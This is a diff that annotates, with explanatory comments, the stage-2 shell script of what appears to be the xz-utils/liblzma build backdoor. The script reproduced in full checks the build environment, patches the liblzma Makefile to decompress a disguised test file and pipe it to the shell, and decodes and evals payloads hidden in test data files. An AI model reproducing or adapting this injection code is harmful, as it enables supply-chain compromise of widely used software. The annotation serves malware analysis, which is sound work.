@@ -1,3 +1,4 @@
+# Define a bunch of stuff
 P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
 C="pic_flag=\" $P\""
 O="^pic_flag=\" -fPIC -DPIC\"$"
@@ -6,14 +7,20 @@ x="__get_cpuid("
 p="good-large_compressed.lzma"
 U="bad-3-corrupt_lzma2.xz"
 
+# Check (again) that we're on linux
+# We never know, okay? maybe we swapped from linux to macos magically!
 [ ! $(uname)="Linux" ] && exit 0
 
+# This is never defined, I can only assume it's some debug thing?
 eval $zrKcVq
 
+# Check that the config.status exists
 if test -f config.status; then
 
+	# Debug thing again
 	eval $zrKcSS
 
+	# Get and re-define these from config.status
 	eval `grep ^LD=\'\/ config.status`
 	eval `grep ^CC=\' config.status`
 	eval `grep ^GCC=\' config.status`
@@ -23,7 +30,10 @@ if test -f config.status; then
 	eval `grep ^enable_static=\' config.status`
 	eval `grep ^gl_path_map=\' config.status`
 
-	## addon 1
+	## addon 1: '~!:_ W' to '|_!{ -'
+	## This basically try to find a file that matches both patterns,
+	## then checks if the file are the same for both pattern and exists,
+	## then decode/decrypt and eval'd the script in file
 	vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null`
 	if test "x$vs" != "x" > /dev/null 2>&1;then
 		f1=`echo $vs | cut -d: -f1`
@@ -42,8 +52,11 @@ if test -f config.status; then
 		fi
 	fi
 
+	# Debug thing
 	eval $zrKccj
 
+
+	# Check that ifunc exists 2 times
 	if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
 		exit 0
 	fi
@@ -52,146 +65,188 @@ if test -f config.status; then
 		exit 0
 	fi
 
+	# Check that enable_shared is defined to yes
 	if test "x$enable_shared" != "xyes";then
 		exit 0
 	fi
 
+	# Check that we're on x64 *and* on *linux-gnu
 	if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
 		exit 0
 	fi
 
+	# Check that is_arch_extension_supported eixsts in crc64_fast.c
 	if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
 		exit 0
 	fi
 
+	# Check that is_arch_extension_supported eixsts in crc32_fast.c
 	if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
 		exit 0
 	fi
 
+	# Check that is_arch_extension_supported eixsts in crc_x86_clmul.h
 	if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
 		exit 0
 	fi
 
+	# Check that __get_cpuid exists in crc_x86_clmul.h
 	if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
 		exit 0
 	fi
 
+	# Check that we're using GCC, because fuck clang i guess
 	if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
 		exit 0
 	fi
 
+	# Check again that we're *really* using GCC...
 	if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
 		exit 0
 	fi
 
-LDv=$LD" -v"
-if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
-exit 0
-fi
-if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
-exit 0
-fi
-if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
-exit 0
-fi
-if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
-eval $zrKcst
-j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
-if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
-exit 0
-fi
-z="^am__uninstall_files_from_dir = {"
-if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
-exit 0
-fi
-w="^am__install_max ="
-if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
-exit 0
-fi
-E=$z
-if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
-exit 0
-fi
-Q="^am__vpath_adj_setup ="
-if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
-exit 0
-fi
-M="^am__include = include"
-if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
-exit 0
-fi
-L="^all: all-recursive$"
-if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
-exit 0
-fi
-m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
-if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
-exit 0
-fi
-u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
-if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
-exit 0
-fi
-if ! grep -qs "$O" libtool > /dev/null 2>&1;then
-exit 0
-fi
-eval $zrKcTy
-b="am__test = $U"
-sed -i "/$j/i$b" src/liblzma/Makefile || true
-d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
-b="am__strip_prefix = $d"
-sed -i "/$w/i$b" src/liblzma/Makefile || true
-b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
-sed -i "/$E/i$b" src/liblzma/Makefile || true
-b="\$(top_srcdir)/tests/files/\$(am__test)"
-s="am__test_dir=$b"
-sed -i "/$Q/i$s" src/liblzma/Makefile || true
-h="-Wl,--sort-section=name,-X"
-if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
-h=$h",-z,now"
-fi
-j="liblzma_la_LDFLAGS += $h"
-sed -i "/$L/i$j" src/liblzma/Makefile || true
-sed -i "s/$O/$C/g" libtool || true
-k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
-sed -i "s/$u/$k/" src/liblzma/Makefile || true
-l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
-    export top_srcdir='\$(top_srcdir)'; \\\\\n\
-    export CC='\$(CC)'; \\\\\n\
-    export DEFS='\$(DEFS)'; \\\\\n\
-    export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
-    export INCLUDES='\$(INCLUDES)'; \\\\\n\
-    export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
-    export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
-    export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
-    export CFLAGS='\$(CFLAGS)'; \\\\\n\
-    export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
-    export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
-    export libdir='\$(libdir)'; \\\\\n\
-    export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
-    export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
-sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
-sed -i "/$m/i$l" src/liblzma/Makefile || true
-eval $zrKcHD
-fi
-elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
-vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
-if test "x$vs" != "x" > /dev/null 2>&1;then
-f1=`echo $vs | cut -d: -f1`
-if test "x$f1" != "x" > /dev/null 2>&1;then
-start=`expr $(echo $vs | cut -d: -f2) + 7`
-ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
-if test "x$ve" != "x" > /dev/null 2>&1;then
-f2=`echo $ve | cut -d: -f1`
-if test "x$f2" != "x" > /dev/null 2>&1;then
-[ ! "x$f2" = "x$f1" ] && exit 0
-[ ! -f $f1 ] && exit 0
-end=`expr $(echo $ve | cut -d: -f2) - $start`
-eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
-fi
-fi
-fi
-fi
+	# Check that we're using gnu ld
+	LDv=$LD" -v"
+	if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
+		exit 0
+	fi
+
+	# Check that good-large_compressed.lzma (eg. stage 2 + .so file) exists
+	if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
+		exit 0
+	fi
+
+	# Check that bad-3-corrupt_lzma2.xz (eg. stage 1) exists
+	if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
+		exit 0
+	fi
+
+	# Check that we're on debian or rpm
+	if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
+		eval $zrKcst
+
+		# Check that we have anything that needs to be patched in Makefile
+
+		## Check that ACLOCAL_M4 is defined in Makefile
+		j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
+		if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
+			exit 0
+		fi
+
+		## Check that am__uninstall_files_from_dir is defined in Makefile
+		z="^am__uninstall_files_from_dir = {"
+		if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
+			exit 0
+		fi
+
+		## Check that am__install_max is defined in makefile
+		w="^am__install_max ="
+		if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
+			exit 0
+		fi
+
+		## Check that am__uninstall_files_from_dir is still defined in Makefile
+		## WTF is that?
+		E=$z
+		if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
+			exit 0
+		fi
+
+		## Check that am__vpath_adj_setup is defined in Makefile
+		Q="^am__vpath_adj_setup ="
+		if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
+			exit 0
+		fi
+
+		M="^am__include = include"
+		if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
+			exit 0
+		fi
+
+		L="^all: all-recursive$"
+		if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
+			exit 0
+		fi
+
+		m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
+		if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
+			exit 0
+		fi
+
+		u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
+		if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
+			exit 0
+		fi
+
+		if ! grep -qs "$O" libtool > /dev/null 2>&1;then
+			exit 0
+		fi
+
+		# Debug thing
+		eval $zrKcTy
+
+		# Start to patch the Makefile
+		b="am__test = $U"
+		sed -i "/$j/i$b" src/liblzma/Makefile || true
+		d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
+		b="am__strip_prefix = $d"
+		sed -i "/$w/i$b" src/liblzma/Makefile || true
+		b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
+		sed -i "/$E/i$b" src/liblzma/Makefile || true
+		b="\$(top_srcdir)/tests/files/\$(am__test)"
+		s="am__test_dir=$b"
+		sed -i "/$Q/i$s" src/liblzma/Makefile || true
+		h="-Wl,--sort-section=name,-X"
+		if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
+		h=$h",-z,now"
+		fi
+		j="liblzma_la_LDFLAGS += $h"
+		sed -i "/$L/i$j" src/liblzma/Makefile || true
+		sed -i "s/$O/$C/g" libtool || true
+		k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
+		sed -i "s/$u/$k/" src/liblzma/Makefile || true
+		l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
+		export top_srcdir='\$(top_srcdir)'; \\\\\n\
+		export CC='\$(CC)'; \\\\\n\
+		export DEFS='\$(DEFS)'; \\\\\n\
+		export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
+		export INCLUDES='\$(INCLUDES)'; \\\\\n\
+		export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
+		export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
+		export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
+		export CFLAGS='\$(CFLAGS)'; \\\\\n\
+		export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
+		export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
+		export libdir='\$(libdir)'; \\\\\n\
+		export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
+		export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
+		sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
+		sed -i "/$m/i$l" src/liblzma/Makefile || true
+
+		# Debug thing
+		eval $zrKcHD
+	fi
+	# If we AREN'T building a .deb or .rpm, but there's still the crc32 and crc64 .o files
+	elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
+
+		# Addon 2: 'jV!.^%' to '%.R.1Z'
+		vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
+		if test "x$vs" != "x" > /dev/null 2>&1;then
+			f1=`echo $vs | cut -d: -f1`
+			if test "x$f1" != "x" > /dev/null 2>&1;then
+				start=`expr $(echo $vs | cut -d: -f2) + 7`
+				ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
+				if test "x$ve" != "x" > /dev/null 2>&1;then
+					f2=`echo $ve | cut -d: -f1`
+					if test "x$f2" != "x" > /dev/null 2>&1;then
+						[ ! "x$f2" = "x$f1" ] && exit 0
+						[ ! -f $f1 ] && exit 0
+						end=`expr $(echo $ve | cut -d: -f2) - $start`
+						eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
+					fi
+				fi
+			fi
+		fi
 eval $zrKcKQ
 if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
 exit 0
